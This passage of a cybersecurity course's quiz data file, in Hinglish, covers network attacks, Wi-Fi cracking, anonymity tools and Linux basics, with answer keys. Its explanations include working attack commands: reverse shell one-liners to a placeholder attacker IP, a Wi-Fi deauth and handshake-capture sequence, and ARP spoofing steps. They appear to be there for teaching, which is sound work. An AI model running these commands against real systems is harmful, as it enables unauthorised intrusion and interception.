  "net-03": [
    { question: "SSH default port number kaunsa hai?", options: ["21", "23", "22", "80"], correctIndex: 2, explanation: "SSH = port 22. Yaad karo: FTP=21, SSH=22, Telnet=23, SMTP=25, DNS=53, HTTP=80, HTTPS=443, SMB=445, RDP=3389. Default ports pe services scan karna recon ka pehla step hai. Nmap se: nmap -sV -p 22 target." },
    { question: "TCP Three-way handshake ka sequence kya hai?", options: ["SYN → ACK → SYN-ACK", "SYN → SYN-ACK → ACK", "ACK → SYN → SYN-ACK", "SYN-ACK → SYN → ACK"], correctIndex: 1, explanation: "TCP connection: Client → SYN (connection chahiye), Server → SYN-ACK (ok, ready hoon), Client → ACK (thanks). SYN flood attack mein attacker millions of SYN bhejta hai, ACK kabhi nahi aata — server ke half-open connections exhaust ho jaate hain, DoS!" },
    { question: "Banner grabbing kya hai aur kyun kaam aata hai?", options: ["Website ka screenshot lena", "Service se connect hote hi milne wala information (version, software name) collect karna — recon ke liye", "Malware banner display karna", "Network banner download karna"], correctIndex: 1, explanation: "Banner = service aapko pehle hi bata deti hai woh kaunsi hai. Jaise: 'SSH-2.0-OpenSSH_7.4' ya 'Apache/2.4.18 (Ubuntu)'. Netcat se: nc target.com 80, phir HEAD / HTTP/1.0 likho. Version info se known CVEs dhundh sakte hain." },
    { question: "UDP aur TCP mein main difference kya hai security ke perspective se?", options: ["UDP zyada secure hai", "UDP connectionless hai — no handshake, no verification. DNS amplification jaise attacks mein use hota hai", "TCP zyada vulnerable hai", "Dono same hain"], correctIndex: 1, explanation: "TCP = connection-based, reliable, ordered. UDP = fire-and-forget, no connection. UDP spoofing zyada aasaan hai (no handshake). DNS (port 53), NTP (123), DHCP (67/68) — sab UDP pe. Amplification DDoS attacks mostly UDP use karte hain." },
    { question: "SMB port aur uski security relevance kya hai?", options: ["Port 80 — web ke liye", "Port 445 — Windows file sharing, EternalBlue (MS17-010) exploit isi port pe tha jo WannaCry ne use kiya", "Port 22 — SSH", "Port 3306 — MySQL"], correctIndex: 1, explanation: "SMB (Server Message Block) = port 445. Windows file/printer sharing. EternalBlue = NSA ka exploit jo leaked hua — SMBv1 vulnerability. WannaCry aur NotPetya ransomware isi pe fhaile. SMBv1 disable karo, Windows updates lagao — aaj bhi unpatched systems mein common vulnerability hai." },
  ],

  "net-04": [
    { question: "ARP Poisoning attack OSI Model ki kaunsi layer pe hoti hai?", options: ["Layer 3 — Network", "Layer 2 — Data Link", "Layer 7 — Application", "Layer 4 — Transport"], correctIndex: 1, explanation: "ARP (Address Resolution Protocol) Layer 2 pe kaam karta hai — IP addresses ko MAC addresses mein convert karta hai. ARP Poisoning mein attacker fake ARP replies bhejta hai: 'Gateway ka MAC main hoon' — phir sab traffic attacker se guzarta hai (MITM)." },
    { question: "SYN Flood attack OSI Model ki kaunsi layer ko target karta hai?", options: ["Layer 2", "Layer 3", "Layer 4 — Transport", "Layer 7"], correctIndex: 2, explanation: "SYN flood = Layer 4 (Transport) attack. TCP handshake incomplete chhod deta hai — server half-open connections hold karta rehta hai jab tak timeout na ho. Server ke connection table full ho jaata hai, legitimate connections reject hone lagte hain. Defense: SYN cookies." },
    { question: "VLAN Hopping attack kaise kaam karta hai?", options: ["VLAN password hack karna", "Double tagging — attacker apne frame pe 2 VLAN tags lagata hai. Switch pehla tag strip karta hai, inner tag dusre VLAN pe deliver karta hai", "VLAN delete karna", "VLAN mein DDoS karna"], correctIndex: 1, explanation: "VLAN Hopping (Double Tagging): attacker native VLAN pe connect ho, frame mein outer tag = native VLAN, inner tag = target VLAN. Switch outer tag strip karta hai, inner tag se target VLAN pe deliver karta hai — bina authorization ke VLAN cross! Defense: native VLAN ko unused VLAN set karo." },
    { question: "SSL Stripping attack mein kya hota hai?", options: ["SSL certificate delete karna", "Attacker HTTPS connection ko HTTP mein convert karta hai — user sochta hai secure hai lekin plaintext jaata hai", "SSL ka password crack karna", "SSL certificate forge karna"], correctIndex: 1, explanation: "SSL Stripping: attacker (MITM position mein) user ko HTTP pe serve karta hai aur server se HTTPS se baat karta hai. User ko lock icon nahi dikhta (ya notice nahi karta). Credentials, session tokens — sab plaintext. Defense: HSTS (browser HTTPS enforce karta hai) + HSTS Preloading." },
    { question: "XSS attack OSI Model ki kaunsi layer pe hoti hai?", options: ["Layer 2", "Layer 4", "Layer 7 — Application", "Layer 3"], correctIndex: 2, explanation: "XSS (Cross-Site Scripting) = Layer 7 (Application layer) attack. HTTP protocol level pe hoti hai — malicious script web application ke through victim ke browser mein inject hoti hai. Layer 7 attacks application logic exploit karte hain — traditional firewalls inhe detect nahi kar paate, WAF chahiye." },
  ],

  "net-05": [
    { question: "DNS Cache Poisoning attack mein attacker kya karta hai?", options: ["DNS server delete karta hai", "DNS resolver mein fake DNS records daalta hai — users galat IP (attacker ke server) pe redirect ho jaate hain", "DNS traffic block karta hai", "DNS password change karta hai"], correctIndex: 1, explanation: "DNS Cache Poisoning: attacker DNS resolver ko convince karta hai ki uske fake record legitimate hain. Phir resolver yeh cached fake record serve karta hai. User bank.com type kare aur attacker ke phishing site pe pahunche. Defense: DNSSEC (digital signatures on DNS records)." },
    { question: "DNS Zone Transfer (AXFR) se attacker kya gain karta hai?", options: ["DNS server ko crash karta hai", "Poori domain ki DNS records — subdomains, mail servers, internal hostnames — information leakage", "Domain ownership transfer karta hai", "DNS cache delete karta hai"], correctIndex: 1, explanation: "Zone Transfer normally secondary DNS servers ke liye hota hai. Misconfigured server agar anyone se AXFR allow kare toh: dig axfr @dns_server domain.com — poori zone file mil jaati hai. Internal IPs, hostnames, mail servers — sab recon ke liye goldmine! Fix: sirf authorized secondary DNS servers se allow karo." },
    { question: "DNS Tunneling kya hai?", options: ["DNS traffic encrypt karna", "DNS queries mein data chhupana — firewall bypass karke covert communication channel banana", "DNS server change karna", "DNS over HTTPS enable karna"], correctIndex: 1, explanation: "DNS Tunneling: data DNS queries/responses mein encode karke chhupate hain. Jaise: c2data.attacker.com ke TXT records mein commands chhupao. Firewall outbound DNS allow karta hai (port 53) — attacker C2 traffic DNS se smuggle karta hai. Tools: dnscat2, Iodine. Detection: unusually large DNS queries, high entropy subdomains." },
    { question: "Certificate Transparency Logs se subdomains kaise milte hain?", options: ["DNS brute force se", "CA publicly SSL certificates log karte hain — crt.sh pe kisi bhi domain ke sab issued certificates dekh sakte hain", "WHOIS se", "Nmap se"], correctIndex: 1, explanation: "Certificate Transparency (CT): sab SSL/TLS certificates publicly logged hote hain (RFC 6962). crt.sh pe jaao, domain.com daalo — sab subdomains ke certificates dikheinge. Passive recon mein bahut powerful — koi noise nahi, target ko pata nahi chalta." },
    { question: "dig command se 'A record' kaise query karte hain?", options: ["dig MX domain.com", "dig domain.com A ya sirf dig domain.com", "dig PTR domain.com", "dig NS domain.com"], correctIndex: 1, explanation: "dig = DNS Information Groper. A record = domain ka IPv4 address. dig example.com ya dig example.com A. MX = mail server, NS = nameserver, TXT = text records (SPF, DKIM), AAAA = IPv6, PTR = reverse DNS (IP to domain). dig +short = concise output." },
  ],

  "net-06": [
    { question: "HTTP Cookie mein HttpOnly flag ka kya matlab hai?", options: ["Cookie sirf HTTPS pe jaaye", "Cookie JavaScript se access nahi ho sakta — XSS se session hijacking prevent hoti hai", "Cookie permanent store hoti hai", "Cookie encrypted hoti hai"], correctIndex: 1, explanation: "HttpOnly flag: browser JavaScript (document.cookie) se yeh cookie access nahi kar paata. XSS attack mein attacker usually document.cookie steal karta hai session token ke liye. HttpOnly flag lagane se yeh attack fail ho jaati hai. Hamesha session cookies pe HttpOnly lagao!" },
    { question: "HSTS (HTTP Strict Transport Security) kya karta hai?", options: ["HTTP traffic encrypt karta hai", "Browser ko force karta hai ki is domain pe hamesha HTTPS use kare — SSL stripping attacks prevent hoti hain", "HTTP speed badhata hai", "HTTPS certificate validate karta hai"], correctIndex: 1, explanation: "HSTS = HTTP response header jisme server kehta hai: 'mere se hamesha HTTPS se baat karo'. Browser cache karta hai yeh instruction. Agar koi SSL strip karne ki koshish kare, browser refuse karega HTTP connection. max-age = kitne din tak. HSTS Preloading = browsers mein hardcoded." },
    { question: "CORS misconfiguration se kya attack possible hai?", options: ["SQL injection", "Malicious website doosri site ki logged-in user ki data access kar sakti hai by abusing overly permissive CORS headers", "Port scanning", "DDoS attack"], correctIndex: 1, explanation: "CORS (Cross-Origin Resource Sharing): 'Access-Control-Allow-Origin: *' ya 'Allow-Origin: attacker.com' — malicious site victim ke browser se authenticated API calls kar sakti hai. Victim ki credentials use ho jaati hain! Private APIs kabhi wildcard CORS allow nahi karein." },
    { question: "TLS 1.3 mein kya improvement aaya TLS 1.2 ke mukable?", options: ["TLS 1.3 slower hai", "1-RTT handshake (faster), weak ciphers removed, perfect forward secrecy mandatory, 0-RTT resumption", "TLS 1.3 mein certificates nahi hoti", "TLS 1.3 aur TLS 1.2 same hain"], correctIndex: 1, explanation: "TLS 1.3 improvements: sirf 1 round-trip handshake (vs TLS 1.2 ka 2), RSA key exchange removed (weak), perfect forward secrecy mandatory (har session unique key), SHA-1 aur MD5 removed. 0-RTT = returning connection mein zero round trips (replay attacks risk hai). Use TLS 1.3 only." },
    { question: "HTTP Request Smuggling attack kya hai?", options: ["HTTP request intercept karna", "Frontend aur backend servers HTTP request boundaries alag-alag interpret karte hain — attacker doosre users ki requests inject kar sakta hai", "HTTP traffic slow karna", "HTTP headers delete karna"], correctIndex: 1, explanation: "HTTP Request Smuggling: Content-Length aur Transfer-Encoding headers ko manipulate karke frontend proxy aur backend server ke beech request boundaries ko confuse karna. Phir attacker apne request ke peechhe doosre users ki requests smuggle karta hai — SSRF, XSS, auth bypass possible." },
  ],

  "net-07": [
    { question: "Nmap mein -sS scan kya hai aur kyun use karte hain?", options: ["Full TCP connection scan", "SYN Stealth scan — SYN bhejta hai, SYN-ACK milne pe RST bhejta hai, connection complete nahi hota — logs mein record nahi hota often", "UDP scan", "OS detection scan"], correctIndex: 1, explanation: "-sS = TCP SYN scan (half-open scan). Full handshake complete nahi hota — server logs mein connection kabhi established nahi dikhta (sometimes). Zyada accurate bhi hai. Root/admin privileges chahiye. Default Nmap scan yahi hai agar root ho." },
    { question: "Nmap NSE script 'vuln' category kya karta hai?", options: ["Port scan karta hai", "Common vulnerabilities ke liye target check karta hai — EternalBlue, Heartbleed jaise known CVEs", "Service version detect karta hai", "Network map banata hai"], correctIndex: 1, explanation: "nmap --script vuln target — NSE (Nmap Scripting Engine) vulnerability scripts run karta hai. SMB vulnerabilities, Heartbleed (SSL), shellshock, ms08-067 jaise check hote hain. Comprehensive lekin noisy — IDS detect kar sakta hai. Combine karo: nmap -sV --script vuln target." },
    { question: "Nmap mein -T4 flag ka kya matlab hai?", options: ["4 ports scan karna", "Aggressive timing template — faster scan, zyada packets per second, lekin noisy", "4 threads use karna", "TCP port 4 scan karna"], correctIndex: 1, explanation: "Nmap timing: -T0 (paranoid, slowest, IDS evasion), -T3 (normal, default), -T4 (aggressive, fast), -T5 (insane, fastest lekin packets drop ho sakte hain). Labs mein -T4 use karo, real pentest mein -T2 ya -T3 zyada safe." },
    { question: "Masscan aur Nmap mein kya fark hai?", options: ["Masscan wireless ke liye hai", "Masscan millions of packets per second bhej sakta hai — internet-wide port scan minutes mein. Nmap detailed analysis ke liye better", "Nmap faster hai", "Dono same hain"], correctIndex: 1, explanation: "Masscan = world's fastest port scanner — own TCP/IP stack use karta hai. 10 million packets/second (with good network). Puri internet scan in 45 minutes! Lekin koi service detection, OS fingerprinting nahi. Workflow: Masscan se open ports dhundo, phir Nmap -sV un ports pe detailed scan karo." },
    { question: "Nmap se firewall evasion ke liye -f flag kya karta hai?", options: ["Faster scan", "Packets ko chhote fragments mein tod deta hai — kuch firewalls fragmented packets ko properly reassemble nahi karte aur allow kar dete hain", "Full scan karta hai", "FTP scan karta hai"], correctIndex: 1, explanation: "-f = packet fragmentation. IP packets ko 8-byte fragments mein tod do. Kuch old/misconfigured firewalls fragmented packets ko inspect nahi karte. Combine with --mtu flag custom fragment size ke liye. Decoy scan (-D): apni IP ke saath fake IPs bhi daalo, logs mein sab mix ho jaayein." },
  ],

  "net-08": [
    { question: "Wireshark mein TCP stream follow karne ka kya fayda hai?", options: ["Packets delete karna", "Ek TCP conversation ke sab packets ek saath readable format mein dekhna — FTP/HTTP credentials, plain text data", "Packets replay karna", "IP address mask karna"], correctIndex: 1, explanation: "TCP Stream Follow: ek connection ke sab packets reconstruct hokar readable text mein dikhta hai. HTTP request/response, FTP login credentials, Telnet session — sab clearly dekh sakte ho. Right-click → Follow → TCP Stream. Unencrypted protocols pe credentials clearly dikhte hain." },
    { question: "Wireshark filter 'http.request.method == \"POST\"' kya show karega?", options: ["Sirf GET requests", "Sirf POST requests — form submissions, login attempts, data uploads", "Sab HTTP traffic", "HTTPS traffic"], correctIndex: 1, explanation: "Wireshark display filters powerful hain. http.request.method == 'POST' = sirf POST requests. Login forms POST se credentials bhejte hain. Combined: http and ip.src == 192.168.1.5 aur method filter — specific user ki sab form submissions dekho." },
    { question: "Pcap file se files extract karne ke liye kaunsa Wireshark feature use hota hai?", options: ["Statistics → Protocol Hierarchy", "File → Export Objects → HTTP — HTTP se transfer hue files (images, documents, executables) extract karna", "Edit → Find Packet", "Capture → Options"], correctIndex: 1, explanation: "Wireshark mein File → Export Objects → HTTP: pcap mein jo bhi files HTTP pe transfer hui hain woh extract kar sakte ho. Malware analysis mein: pcap se suspicious executables, config files nikalna. FTP ke liye bhi works. Very useful for network forensics." },
    { question: "C2 beaconing traffic ko network logs mein kaise identify karte hain?", options: ["Bahut fast requests se", "Regular interval pe same destination pe small requests — jaise har 30 seconds mein 4.5.6.7:443 pe same size packets", "Large file downloads se", "Random ports se"], correctIndex: 1, explanation: "C2 (Command & Control) beaconing pattern: malware infected machine se C2 server ko regular intervals pe check-in karta hai. Traffic analysis mein: same destination, same packet size, regular timing (30s, 60s, 300s) = suspicious. IO Graphs in Wireshark se beaconing pattern clearly dikha jaata hai." },
    { question: "tshark kya hai?", options: ["Wireshark ka updated version", "Wireshark ka command-line version — scripts aur automation ke liye, GUI nahi", "Traffic generator tool", "Network speed tester"], correctIndex: 1, explanation: "tshark = Wireshark ka CLI version. Useful for: automated pcap analysis, scripting, remote capture over SSH (ssh user@target 'tcpdump -w - -i eth0' | wireshark -k -i -), large file processing without GUI. Wireshark filters tshark mein bhi kaam karti hain: tshark -r file.pcap -Y 'http.request'." },
  ],

  "net-09": [
    { question: "ARP Poisoning MITM attack mein kya hota hai?", options: ["Router hack hota hai", "Attacker fake ARP replies bhejta hai: 'Gateway ka MAC main hoon' aur 'Main target hoon' — dono ko. Traffic attacker se guzarta hai", "WiFi password change hota hai", "DNS change hota hai"], correctIndex: 1, explanation: "ARP Poison steps: arpspoof/bettercap se target aur gateway ko fake ARP replies bhejo. Target sochta hai gateway = attacker's MAC, Gateway sochta hai target = attacker's MAC. Sab traffic attacker se guzarta hai. IP forwarding enable karo (echo 1 > /proc/sys/net/ipv4/ip_forward) toh traffic forward hota hai — victim notice nahi karta." },
    { question: "DHCP Starvation attack kya karta hai?", options: ["DHCP server delete karna", "Fake MAC addresses se sab DHCP IPs exhaust kar deta hai — legitimate clients IP nahi le paate. Phir rogue DHCP server deploy karo", "DHCP password change karna", "DHCP traffic intercept karna"], correctIndex: 1, explanation: "DHCP Starvation: attacker thousands of fake MAC addresses se DHCP Discover bhejta hai — DHCP pool exhaust ho jaata hai. Phir attacker apna rogue DHCP server chalata hai — clients usse IP, gateway, DNS lenge. Gateway apna server set karo = MITM automatic!" },
    { question: "Evil Twin WiFi attack kya hai?", options: ["WiFi password crack karna", "Legitimate WiFi ke naam se duplicate AP banana — users connect karte hain aur attacker ka traffic sab see karta hai", "WiFi router reset karna", "WiFi range badhana"], correctIndex: 1, explanation: "Evil Twin: legitimate AP ka exact SSID clone karo, zyada power pe broadcast karo — users automatically strong signal wale (attacker ke) AP se connect ho jaate hain. Captive portal se credentials le sakte ho ya MITM kar sakte ho. WPA2 Enterprise mein bhi possible — hostapd-wpe tool use hota hai." },
    { question: "MAC flooding switch pe kya karta hai?", options: ["Switch band ho jaata hai", "Switch ka MAC address table overflow ho jaata hai — switch hub ki tarah behave karne lagta hai, sab ports pe traffic broadcast hone lagta hai", "Switch slow ho jaata hai sirf", "Switch restart ho jaata hai"], correctIndex: 1, explanation: "CAM table (Content Addressable Memory) mein MAC → port mappings hoti hain. macof tool se thousands of fake MACs bhejo — CAM table full ho jaata hai. Switch fail-open mode mein chala jaata hai aur hub ki tarah behave karta hai = sab traffic sab ports pe. Sniffing easy!" },
    { question: "Static ARP entries se ARP Poisoning kaise rokein?", options: ["ARP disable karo", "Important systems (gateway) ka static ARP entry set karo — fake ARP replies override nahi kar sakti", "Firewall lagao sirf", "Naya switch kharido"], correctIndex: 1, explanation: "arp -s gateway_ip gateway_mac = static entry. Dynamic ARP inspection (DAI) on managed switches bhi option hai — DHCP snooping table se validate karta hai. arpwatch tool unusual ARP activity alert karta hai. Ultimately: VLAN segmentation + DAI + port security = best defense." },
  ],

  "net-10": [
    { question: "Memcached DDoS amplification attack mein amplification factor kya hai?", options: ["10x", "100x", "51,000x", "1,000x"], correctIndex: 2, explanation: "Memcached amplification = 51,000x! Ek 15-byte UDP request se 1MB response aa sakta hai. 2018 GitHub attack: 1.35 Tbps — Memcached se. Mitigation: Memcached ko UDP pe internet pe expose mat karo, firewall karo, authentication enable karo." },
    { question: "SYN Flood DoS attack ko SYN Cookies se kaise mitigate karte hain?", options: ["SYN packets block karna", "Server half-open connections store nahi karta — cryptographic cookie SYN-ACK mein encode karta hai, sirf valid ACK pe connection complete karta hai", "Firewall se SYN block karna", "Rate limiting lagana"], correctIndex: 1, explanation: "SYN Cookies: server SYN-ACK mein ISN (Initial Sequence Number) ko cryptographic hash se encode karta hai. Connection state store nahi karta. Jab ACK aata hai, ISN se verify karta hai. Half-open connection table exhaust nahi hota. Linux mein automatic enable hota hai under attack." },
    { question: "Slowloris attack kaise kaam karta hai?", options: ["Bahut fast requests bhejta hai", "Bahut slow incomplete HTTP requests bhejta hai — server connections open rakhta hai, ek server ke saare connections exhaust ho jaate hain", "UDP flood karta hai", "DNS attack karta hai"], correctIndex: 1, explanation: "Slowloris: attacker server ko bahut saari HTTP connections open karta hai lekin requests kabhi complete nahi karta — headers slowly bhejta hai. Server har connection ke liye socket open rakhta hai. Thread-based servers (Apache) ke against effective. Event-driven servers (Nginx) usually resilient hote hain." },
    { question: "DDoS attack mein botnet ka kya role hota hai?", options: ["Botnet DDoS mitigate karta hai", "Attacker ke control mein thousands/millions of compromised computers — coordinated attack traffic generate karte hain", "Botnet firewall hai", "Botnet backup system hai"], correctIndex: 1, explanation: "Botnet = infected computers ki army (zombies) jinhein attacker C2 server se control karta hai. DDoS command pe sab simultaneously target pe traffic bhejte hain. Traffic legitimate machines se aata hai, block karna mushkil. Botnets hire bhi hote hain (DDoS-as-a-Service)." },
    { question: "NTP Amplification attack mein kaunsa NTP command use hota hai?", options: ["ntpdate", "monlist — recent clients ki list request, NTP server 100+ responses bhejta hai, massive amplification", "ntpq", "ntp sync"], correctIndex: 1, explanation: "NTP monlist command: NTP server recently connected clients ki list return karta hai — typically 100+ entries. Attacker small monlist request (victim's IP spoofed as source) bhejta hai, massive response victim pe aata hai. 556x amplification! Fix: monlist disable karo NTP config mein: restrict default noquery." },
  ],

  "net-11": [
    { question: "WPA2 4-way handshake capture karne ke liye kya step chahiye?", options: ["Router ka password pata hona", "Monitor mode enable karo, airodump-ng se capture karo, aur ek client ko deauth karo taki reconnect kare — handshake capture ho jaaye", "Router physically access karna", "Internet connection chahiye"], correctIndex: 1, explanation: "WPA2 handshake capture: airmon-ng start wlan0 (monitor mode), airodump-ng -c channel --bssid AP_MAC -w capture wlan0mon, aireplay-ng -0 1 -a AP_MAC client_MAC wlan0mon (deauth), captured handshake file mein hoga. Phir aircrack-ng ya hashcat se offline crack karo." },
    { question: "PMKID attack WPA2 mein kyun powerful hai?", options: ["Zyada fast hai sirf", "Client deauth ki zaroorat nahi — active clients ke bina sirf AP se PMKID capture karke offline crack kar sakte hain", "Government ban hai", "Sirf WPA3 pe kaam karta hai"], correctIndex: 1, explanation: "Traditional WPA2 cracking = 4-way handshake capture karo (koi client connect hona chahiye). PMKID attack (2018, Jens Steube): sirf AP se EAPOL frame lo, usmein PMKID hota hai. PMKID = HMAC-SHA1(PMK, 'PMK Name', AP_MAC, Client_MAC). Offline crack karo. hcxdumptool + hashcat -m 22000." },
    { question: "WiFi mein WPS (Wi-Fi Protected Setup) kyun disable karna chahiye?", options: ["WPS battery waste karta hai", "WPS 8-digit PIN brute force vulnerable hai — Reaver/Bully 6-8 hours mein PIN dhundh sakte hain", "WPS slow karta hai connection", "WPS outdated protocol hai sirf"], correctIndex: 1, explanation: "WPS PIN = 8 digits, lekin actually effective 11,000 combinations (first 4 digits alag verify hote hain, last digit checksum). Reaver tool: methodically sab pins try karta hai — WPA2 password kitna bhi strong ho, WPS se attack possible! Home routers pe WPS hamesha disable karo." },
    { question: "Evil Twin Enterprise attack (hostapd-wpe) kya karta hai?", options: ["WPA2 Personal crack karta hai", "Rogue EAP server banata hai — corporate WPA2-Enterprise credentials capture karta hai jab users fake AP se connect karte hain", "Bluetooth attack karta hai", "VPN bypass karta hai"], correctIndex: 1, explanation: "WPA2-Enterprise mein users RADIUS server se authenticate karte hain. Evil Twin + hostapd-wpe se rogue RADIUS server banao — jab victim connect kare, EAP (MSCHAPV2) credentials milte hain. Offline NTLMv2 hash crack karo ya relay attack karo. Corporate environments ke liye critical threat." },
    { question: "Monitor mode aur managed mode mein kya fark hai WiFi mein?", options: ["Monitor mode internet ke liye", "Monitor mode = sab WiFi traffic capture karo (apne liye nahi bhi), Managed mode = sirf apne AP ka traffic process karo", "Monitor mode WPS ke liye", "Dono same hain"], correctIndex: 1, explanation: "Managed mode = normal WiFi use, sirf apne AP se connected traffic. Monitor mode = card passively sab channels ka traffic capture karta hai — probe requests, beacons, data frames — chahe kisi bhi AP ka. Packet injection bhi possible. airmon-ng start wlan0 → wlan0mon interface." },
  ],

  "net-12": [
    { question: "Tor network mein 'exit node' ka kya role aur risk hai?", options: ["Entry point hai", "Last relay node jo actual internet se connect karta hai — exit node operator unencrypted traffic dekh sakta hai", "Guard node hai", "Directory server hai"], correctIndex: 1, explanation: "Tor circuit: Entry guard → Middle relay → Exit node. Exit node = woh point jahan Tor encryption khatam hoti hai aur actual destination se connect hota hai. Exit node operator = man-in-the-middle position mein hai HTTP traffic ke liye. HTTPS use karo Tor ke saath bhi!" },
    { question: "ProxyChains kaise kaam karta hai?", options: ["Proxy server banana", "Applications ka traffic multiple proxy servers ke through route karta hai — source IP chhupata hai", "VPN create karna", "DNS change karna"], correctIndex: 1, explanation: "ProxyChains: /etc/proxychains.conf mein proxy list daalo (SOCKS5, HTTP, SOCKS4). proxychains nmap target.com — nmap ka traffic configured proxies se guzarta hai. Attacker ka real IP directly target se connect nahi hota. Multiple proxies = attribution mushkil." },
    { question: "Tails OS kya hai aur kyun use kiya jaata hai?", options: ["Hacking OS hai", "Amnesic OS — RAM pe chalta hai, shutdown pe koi trace nahi — privacy ke liye", "Ubuntu ka alternative hai", "Server OS hai"], correctIndex: 1, explanation: "Tails (The Amnesic Incognito Live System): USB se boot karta hai, sab kuch RAM mein hota hai. Shutdown pe koi data disk pe save nahi hota — RAM clear ho jaati hai. Sab traffic automatically Tor se jaata hai. Whistleblowers, activists, journalists use karte hain. Forensics mein tails machine se kuch nahi milta." },
    { question: "OPSEC failure se hackers kaise pakde jaate hain?", options: ["Tools se", "Behavior se — real identity information accidentally online share karna, same username use karna, VPN off karte waqt real IP leak", "Hardware se", "Network speed se"], correctIndex: 1, explanation: "Famous OPSEC failures: SilkRoad founder — apna real email Stackoverflow pe use kiya. LulzSec — IRC mein baat ki bina Tor ke. Hector Monsegur (Sabu) — Tor bhool ke login kiya ek baar. Tools se zyada behavior matter karta hai. Consistency critical hai — ek bhi galti attribution de sakti hai." },
    { question: "Browser fingerprinting kya hai?", options: ["Browser download karna", "Browser ke unique characteristics (plugins, fonts, screen size, timezone) se user identify karna — cookies ke bina bhi tracking possible", "Browser history delete karna", "Browser update karna"], correctIndex: 1, explanation: "Browser fingerprint = 100+ attributes combine hoke unique ID banaate hain: screen resolution, installed fonts, canvas rendering, WebGL fingerprint, timezone, language, plugins. Tor Browser sabko standardize karta hai fingerprinting resist karne ke liye. Test: coveryourtracks.eff.org." },
  ],

  // ── PHASE 3: LINUX & WINDOWS ─────────────────────────────────────────────

  "os-01": [
    { question: "Linux mein /etc/passwd aur /etc/shadow mein kya fark hai?", options: ["Dono same hain", "/etc/passwd = usernames aur info (world-readable), /etc/shadow = hashed passwords (root-only readable)", "/etc/passwd passwords store karta hai", "/etc/shadow usernames store karta hai"], correctIndex: 1, explanation: "/etc/passwd world-readable hai — username, UID, GID, home dir, shell info. Previously passwords bhi the lekin ab 'x' hota hai. /etc/shadow = sirf root padh sakta hai — hashed passwords, password expiry policy. Attacker dono combine karte hain: /etc/passwd (users) + /etc/shadow (hashes)." },
    { question: "find / -perm -4000 2>/dev/null kya dhundta hai?", options: ["World-writable files", "SUID bit set files — root ke permissions se chalte hain, privilege escalation ke liye", "Executable files sirf", "Log files"], correctIndex: 1, explanation: "find / -perm -4000 = SUID bit wali sab files. -4000 = setuid. /dev/null ke redirect se errors chhup jaate hain. SUID files run karke agar woh shell spawn kar sakein toh root access milta hai. GTFOBins.github.io pe sab known SUID exploits hain." },
    { question: "/proc virtual filesystem mein kya milta hai?", options: ["Programs stored hote hain", "Running processes aur kernel ki live information — /proc/PID/maps (memory), /proc/net/ (network), /proc/1/environ (environment variables)", "Log files hote hain", "User data hota hai"], correctIndex: 1, explanation: "/proc = pseudo-filesystem, disk pe nahi hai — RAM se dynamically generate hota hai. /proc/PID/cmdline = process ke arguments, /proc/PID/environ = environment variables (passwords leak?), /proc/net/tcp = network connections, /proc/cpuinfo = CPU info. Forensics aur CTF mein bahut kaam aata hai." },
    { question: "Soft link aur hard link mein kya fark hai?", options: ["Soft link faster hai", "Soft link = pointer to path (breaks if original deleted), Hard link = same inode, original delete hone pe bhi data accessible", "Hard link network pe kaam karta hai", "Dono same hain"], correctIndex: 1, explanation: "Hard link: same inode point karta hai — ek file multiple names. Original file delete karo, hard link se data accessible rahega. Soft/Symbolic link: path ka pointer — original delete hone pe broken link. ln = hard link, ln -s = soft link. Security: hard links SUID binaries ki copies create kar sakte hain." },
    { question: "Linux mein /tmp directory mein kaunsi security issue hai?", options: ["Tmp mein files permanent hoti hain", "World-writable hai — kaun bhi files yahan create/delete kar sakta hai — temp file race conditions, malware staging area", "Tmp sirf root ke liye hai", "Tmp encrypted hoti hai"], correctIndex: 1, explanation: "/tmp aur /var/tmp = world-writable (sticky bit ke saath). Sticky bit = sirf file owner delete kar sakta hai. Malware often /tmp mein stage hota hai. Race conditions (TOCTOU attacks) /tmp mein common. noexec mount option laga do /tmp pe — wahan se executables nahi chalein." },
  ],

  "os-02": [
    { question: "ps aux command kya show karta hai?", options: ["Processor speed", "Sab running processes — user, PID, CPU%, Memory%, command name", "Port status", "Package list"], correctIndex: 1, explanation: "ps aux: a = all users ke processes, u = user-friendly format (user name show karo), x = no terminal (daemon processes). Output: USER PID %CPU %MEM VSZ RSS TTY STAT TIME COMMAND. ps aux | grep python — python processes dhundho. Malware hunting mein: suspicious processes, unknown commands." },
    { question: "strings command kaise use hota hai malware analysis mein?", options: ["Network strings analyze karna", "Binary/executable mein printable ASCII strings dhundna — URLs, IPs, config, hardcoded passwords", "Log file strings count karna", "Encryption key generate karna"], correctIndex: 1, explanation: "strings malware.exe — binary mein hardcoded strings: C2 URLs, registry keys, error messages, function names. Minimum length filter: strings -n 8 file. Encoded strings ke liye: strings -e l (little-endian 16-bit). Quick triage ke liye malware analyst ka first tool." },
    { question: "netstat -tulpn output mein kya information milti hai?", options: ["Network speed", "Listening ports, protocols, process names aur PIDs — kaunsa process kaunse port pe sun raha hai", "Network traffic", "DNS records"], correctIndex: 1, explanation: "netstat -tulpn: t=TCP, u=UDP, l=listening only, p=process name, n=numeric (no DNS resolution). Output: Proto Local_addr Foreign_addr State PID/Program. Malware hunting: unknown processes listening pe? Backdoor? ss command modern alternative hai." },
    { question: "xxd command kya karta hai?", options: ["Files delete karta hai", "File ka hex dump show karta hai — binary files ko hex + ASCII mein dekh sakte hain", "Files compress karta hai", "XML parser hai"], correctIndex: 1, explanation: "xxd file.bin — hexdump: baat address, hex bytes, ASCII representation. File magic bytes dekh sakte hain (file type identify karo). xxd -r = reverse, hex se binary wapas. Malware analysis mein: shellcode, hardcoded bytes analyze karna. od command bhi similar — od -x file." },
    { question: "netcat se reverse shell kaise milti hai?", options: ["nc target 4444", "Attacker: nc -lvp 4444 sunata hai. Target: nc attacker_ip 4444 -e /bin/bash ya bash -i >& /dev/tcp/attacker/4444 0>&1", "nc -scan target", "nc -download target"], correctIndex: 1, explanation: "Reverse shell: target machine se attacker ki taraf connection. Attacker: nc -lvp 4444 (listener). Target pe: nc 192.168.1.5 4444 -e /bin/bash (older nc) ya bash -i >& /dev/tcp/192.168.1.5/4444 0>&1 (pure bash). Firewall mein outbound connection usually allowed hoti hai isliye reverse shells popular hain." },
  ],

  "os-03": [
